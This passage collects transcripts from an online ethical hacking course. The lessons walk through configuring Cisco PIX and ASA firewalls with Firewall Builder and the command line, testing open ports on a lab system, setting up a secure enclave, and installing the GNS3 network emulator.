> **[3:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=208)** Let's create our simple ASA firewall configuration.
>
> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=212)** I'll select Create new firewall.
>
> **[3:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=214)** I'll call the firewall ASA01 and I'll select Cisco ASA, Cisco PIX as the firewall type.
>
> **[3:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=224)** I'll select Next, and I'll take the default action of configuring the interfaces manually.
>
> **[3:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=230)** The first interface I'll add is the external internet.
>
> **[3:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=233)** I'll call the interface GigabitEthernet0.
>
> **[4:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=241)** I'll label it Outside, and configure a static address of 176.0.2.1 with a netmask of 255.255.255.0.
>
> **[4:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=259)** I'll add another interface, GigabitEthernet1, with a label of DMZ.
>
> **[4:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=269)** And I'll add a static address of 192.168.1.254, and the netmask of 255.255.255.0.
>
> **[4:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=280)** I'll add a third interface, GigabitEthernet 2, Inside, and add an address of 10.0.0.1, and a mask of 255.255.255.0.
>
> **[5:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=300)** Note that when I press Next we can see that the security levels of zero, 50, and 100 have been added.
>
> **[5:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=307)** I can now set the network zones for the interfaces, Any for Outside, 192.168.1.0 for the DMZ, and 10.0.0.0 for Inside.
>
> **[5:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=324)** I'll press Finish to confirm the settings.
>
> **[5:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=327)** The firewall has now been added to my left hand Objects panel.
>
> **[5:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=330)** I'll select Version 8.3 of the iOS software.
>
> **[5:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=335)** Let's take a quick look at the firewall settings.
>
> **[5:38](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=338)** These determine how the target firewall rules are compiled once we've set up the firewall.
>
> **[5:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=343)** We can see on the Compiler screen that we'll generate outbound ACLs.
>
> **[5:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=348)** If I select Inspect we can see that we'll generate the class map and global policy for default inspections.
>
> **[5:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=355)** I won't review these settings in detail, but if you're using Firewall Builder then you should take the time to understand them.
>
> **[6:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=361)** I'll close this window now.
>
> **[6:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=364)** I'll now add a network by opening the Objects item and right clicking Networks.
>
> **[6:13](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=373)** I'll change the name to Secure Enclave, and the address to 10.0.0.0, and the mask to 255.255.255.0.
>
> **[6:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=390)** I'll go down to Services, and right click on ICMP, and add a new ICMP service.
>
> **[6:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=402)** We'll select Type eight for the ICMP ping.
>
> **[6:49](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=409)** Firewall Builder will automatically provide the return path, so we don't need to specifically allow an echo reply.
>
> **[6:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=415)** I'll now go back to Firewalls and add a policy.
>
> **[6:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=419)** This provides me with the default deny any traffic and I'll press plus to add a new rule before that.
>
> **[7:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=426)** I'll drag and drop the Secure Enclave network into the Source field.
>
> **[7:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=432)** And I'll select the DMZ interface and drag that into the Interface field.
>
> **[7:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=441)** I'll drag the ICMP service into the Service field and I'll select the Action Accept.
>
> **[7:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=449)** I can right click on the rule and at the bottom select Compile Rule to check that the rule is valid.
>
> **[7:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=456)** Okay, that's all we need to do to demonstrate how Firewall Builder works.
>
> **[7:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=460)** Let's compile the rule set.
>
> **[7:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=466)** On the left we can see the compilation was a success and we can inspect the generated files using the Inspect Generated Files button.
>
> **[7:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=475)** As we scroll down, we can see the standard iOS configuration for the interfaces and the nameif and security level statements.
>
> **[8:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=483)** Further down, we can see the access list and access group configuration.
>
> **[8:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=489)** That's a brief introduction to Firewall Builder.
>
> **[8:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=492)** This tool comes into its own when configuring complex rule sets, and as a tester you may want to check what rule sets it creates and compare them to the rule sets installed in the firewalls you are testing.

> [!info]- Semantic Content
>
> **Code Keywords:** interface (6), let (4), static (3), type. (2), function (1)
> **Env Vars:** icmp (4), dmz (3), nat (2), asa (2), dns (1)
> **Versions:** 255.255.255 (4), 10.0.0 (3), 192.168.1 (2), 176.0.2 (1), version 8 (1)
> **UI Navigation:** click on (2), select the (2), open the (1), drag and drop (1), scroll down (1)
> **Prerequisites:** getting started (1), configure (1), set up (1)
> **CLI Commands:** make (2)
> **Code Identifiers:** ios (2)
> **Analogies:** such as (1), for example (1)

#### Port testing
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=0)** - [Instructor] Port tester, written by Mateo Marquez Conley, is a simple but useful tool for checking whether specific ports are open for accessing a target URL.
>
> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=10)** This checks the pathway to the URL, including any proxy or firewall that might be positioned in front of it.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=17)** This tool can be downloaded from the site shown.
>
> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=20)** It's a zip file containing a Java JAR executable.
>
> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=24)** I have the port tester loaded on my Windows 7 system, so let's use it to look at the Metasploit server.
>
> **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=33)** The tool displays a window in which we can enter a URL and port numbers, and it will run a very quick check to see if these are open.
>
> **[0:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=41)** Let's try port 53 on our Metasploit system.
>
> **[0:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=44)** I'll enter the IP and port number and press Test.
>
> **[0:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=48)** Okay, we have a DNS service operating.
>
> **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=52)** Let's put in a few more ports and test them.
>
> **[0:56](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=56)** And we quickly see which of these ports are open.
>
> **[0:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=59)** While we can do a full scan of a system, this tool is useful when we have a very specific port or set of ports to check on a firewall.

> [!info]- Semantic Content
>
> **Env Vars:** url (3), jar (1), dns (1)
> **Code Keywords:** let (3)
> **Ports:** port 53 (1)
> **Exercise Files:** zip file (1)
> **Definitions:** is a  (1)
> **Speakers:** - [instructor] (1)


### 2. Hardware Firewalls

#### Set up a Cisco PIX firewall
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=0)** - [Instructor] Cisco provides a range of popular home and business-grade firewalls, built using a propriety Cisco operating system known as IOS.
>
> **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=8)** This provides a much more powerful firewall and solution to the built-in Windows and Linux firewalls, so we'll take a first look at how to access and configure them.
>
> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=17)** I'm using a Cisco PIX firewall, which despite being somewhat long in the tooth, is still a useful device for becoming familiar with IOS configuration and a low-cost way of creating secure enclaves in a home network.
>
> **[0:31](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=31)** It has a serial console port, a one port, and an integrated four port ethernet switch.
>
> **[0:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=37)** I'll be connecting this to my local network switch in order to establish a secure subnet.
>
> **[0:42](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=42)** I've connected to the PIX using a USB-to-serial adaptor into the RS-232 console port, and an ethernet cable from my local network switch to the PIX1 port.
>
> **[0:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=53)** I'll check the serial configuration using device manager.
>
> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=57)** When I open the Ports entry, I can see the ATEN adaptor on COM3.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=62)** I'll now connect using the PuTTY utility to the PIX firewall.
>
> **[1:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=66)** I'll set PuTTY to serial and use COM3.
>
> **[1:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=74)** And I get the PIX prompt.
>
> **[1:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=76)** I'll use help, or question mark, to list available commands.
>
> **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=80)** I'll use the enable command to enter privilege mode.
>
> **[1:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=84)** The default password is blank, but you'll want to change that to your own password once you get in.
>
> **[1:29](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=89)** You can do this with the enable password command.
>
> **[1:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=94)** Once in privilege mode, we can again type help to check the commands we have available.
>
> **[1:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=100)** We now have the full set of privileged commands that we can use.
>
> **[1:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=104)** Let's check the configuration using the show configure command.
>
> **[1:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=112)** Okay, we can see that the device has two interfaces, ethernet0 and ethernet1.
>
> **[1:58](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=118)** Ethernet0 is the one port, which we can see is named outside.
>
> **[2:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=122)** And ethernet1 is the integrated four port switch, which we use for internal connection, which is also known as inside.
>
> **[2:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=130)** We've also got a number of services defined with their associated port numbers.
>
> **[2:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=134)** Looking further down, we can see that we have no IP address inside, and the outside IP address shows 23.107.10.2.
>
> **[2:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=143)** From this point, we can enter the configuration environment by entering configure terminal, or config t for short.
>
> **[2:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=152)** We now have config showing on the prompt, and when we press help, we get the full set of configuration commands.
>
> **[2:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=160)** One of the first things we can do is to create a normal user role for doing configuration.
>
> **[2:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=165)** We can type show username to check for credentials, and we can see that we have just one account registered.
>
> **[2:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=174)** We can set another account up.
>
> **[3:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=180)** I have a new local account registered at privilege level two.
>
> **[3:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-a-cisco-pix-firewall-2?u=76281980&t=184)** We can save this by entering the right memory command, or wri m for short, and we can now restart the device with the new configuration, using the reload command.

> [!info]- Semantic Content
>
> **Env Vars:** pix (4), ios (2), com3 (2), usb (1), pix1 (1)
> **Code Keywords:** switch (4), let (1)
> **Prerequisites:** configure (3)
> **Definitions:** known as (2)
> **Versions:** 23.107.10 (1)
> **Tools:** terminal (1)
> **UI Navigation:** open the (1)
> **Speakers:** - [instructor] (1)

#### Create a secure enclave
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=0)** - [Instructor] Okay, we are back at the PIX prompt, we can now log in and look at some operational commands.
>
> **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=7)** One of the operational commands is ping, like the windows and limits command.
>
> **[0:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=12)** To use it, we can specify an external address, using the outside interface.
>
> **[0:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=16)** However, we don't have an outside connection and we get no response recieved.
>
> **[0:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=22)** Let's set the PIX up by configuring a secure enclave on our local network.
>
> **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=26)** As shown in the slide we'll be on a 192.168.1.0/24, local network.
>
> **[0:34](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=34)** And we'll create a secure enclave beyond the PIX security device, with addresses of 10 dot knot dot knot dot knot slash 24.
>
> **[0:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=43)** I've connected a couple of systems to the local network so that we can test connectivity.
>
> **[0:48](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=48)** I'll set the IP addresses for the two ethernet ports and set them to automatic mode to bring them up and operational.
>
> **[0:54](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=54)** I'll assign a static address of 192.168.1.254 to the PIX.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=60)** And bring up the interface.
>
> **[1:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=62)** When configuring an IOS device, you might need to use the no version of the command to remove any existing rule.
>
> **[1:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=68)** We have an existing outside address configured, so let's remove it.
>
> **[1:16](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=76)** Okay, we can now put in our new address.
>
> **[1:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=82)** I'll set up the secure enclave on the inside of the PIX with 10 dot knot dot knot dot one, as the gateway between the secure enclave and the rest of the world.
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=92)** And bring up the interface.
>
> **[1:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=97)** I can now set a route, which ensures that any internal device, which interconnect out, will do so.
>
> **[1:43](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=103)** Through the internet gateway on my local network.
>
> **[1:47](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=107)** Let's write this to memory.
>
> **[1:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=111)** At this point, I can ping from my PIX consul to the secure enclave.
>
> **[1:59](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=119)** And I can also ping out to the local network.
>
> **[2:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=126)** Onto the world.
>
> **[2:12](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=132)** I can also ping, from my local network work station, to the cisco interface.
>
> **[2:21](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=141)** The configurations so far, does not allow a workstation in the secure enclave, to ping out to the world.
>
> **[2:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=148)** Let us set the firewall to do that.
>
> **[2:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=150)** First I'll put in a access list in a group, with a unique number of one to allow ICMP.
>
> **[2:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=161)** I'll also set up the network address translation for the secure enclave.
>
> **[2:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=165)** And assign the unique NAT ID of 101, this can be any unique number to link the two.
>
> **[2:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=172)** I can now ping from my secure enclave station, 10 dot knot dot knot dot two, out to the internet via the local network and the wider world.
>
> **[3:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=180)** In fact, with this configuration, I've allowed the local workstation full access to the outside, so I can browse and collect email and so on.
>
> **[3:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=189)** We can do much more with the cisco firewalls in terms of filtering IP addresses, subnets and protocols, as well as more sophisticated address translation.
>
> **[3:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=198)** However, this simple configuration is sufficient, to provide a sense of the power of a stand alone firewall.
>
> **[3:25](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=205)** So with the minimal firewall set up, let's run a map on the PIX to see what it exposes.
>
> **[3:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=212)** Okay, we can see that very little has been exposed.
>
> **[3:36](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/create-a-secure-enclave-3?u=76281980&t=216)** Other than that ICMP is running, and the MAC address reflex a cisco devise.

> [!info]- Semantic Content
>
> **Env Vars:** pix (7), icmp (2), ios (1), nat (1), mac (1)
> **Code Keywords:** let (5), interface (4), static (1)
> **Prerequisites:** set up (3)
> **Versions:** 192.168.1 (2)
> **Speakers:** - [instructor] (1)


### 3. Network Simulation Using GNS3

#### Install GNS3
> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980)

> [!transcript]- Transcript
>
> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=0)** - [Instructor] If you don't have a Cisco device to work with, you can download and run the GNS3 emulator from the website shown here.
>
> **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=7)** This is a professional tool, which is widely used by network architects and one which allows testers to really understand networks.
>
> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=15)** It can be used not only for emulation of Cisco and other vendor devices, but it can also connect to the real world and include hardware based devices and the internet in its networks.
>
> **[0:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=28)** We'll use GNS3 to gain an initial familiarity with the Cisco Advanced Security Appliance, the ASA, which is a powerful content perimeter defense device from Cisco.
>
> **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=40)** Whereas the PIX allowed us to learn about home and small business perimeter defenses, the ASA provides an insight into the enterprise level of perimeter defense.
>
> **[0:51](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=51)** We'll take a tour of GNS3, then I'll set up a basic network, and show it operating.
>
> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=57)** I'll then create a routed network.
>
> **[1:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=60)** And finally, add an ASA into it to provide a secure enclave and demonstrate how to configure permitted traffic flows.
>
> **[1:09](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=69)** With GNS3 we don't just simulate networks, we run the actual device code in an emulator, so we get the real life experience of managing networks.
>
> **[1:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=79)** By necessity, this will be a whirlwind tour of both the iOS networking capabilities and GNS3 and we'll only scratch the surface of both GNS3 and the ASA within the scope of this course.
>
> **[1:32](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=92)** There's a lot to learn and to fully understand iOS configuration and networking is a more advanced topic in network security, this will require additional prerequisite experience and is a set of courses in its own right.
>
> **[1:46](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=106)** However, we will do sufficient to understand how these devices are set up and perhaps whet your appetite for secure networking.
>
> **[1:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=113)** To appreciate the power of GNS3 means understanding not only how it works, but also its intended configuration for use with large networks.
>
> **[2:03](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=123)** GNS3 is very scalable to networks with hundreds of devices, to run in this mode requires that it be deployed in two parts, a dedicated emulation server and a user interface running on a standard workstation.
>
> **[2:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=138)** It can also be deployed as an appliance and as an all-in-one Windows application.
>
> **[2:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=144)** We'll be using only the simplest of configurations and for this I've downloaded the Windows all-in-one version 1.4.6 from GitHub.
>
> **[2:35](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=155)** This is not the latest release, but we need to use this version to run the available ASA version 8.4.2 that we'll be using for this course.
>
> **[2:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=164)** Let's start at the software, the software can run using either a local server of a GNS3 VM in either VMware or VirtualBox.
>
> **[2:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/install-gns3?u=76281980&t=173)** For simplicity, I'll select the local server option.
>
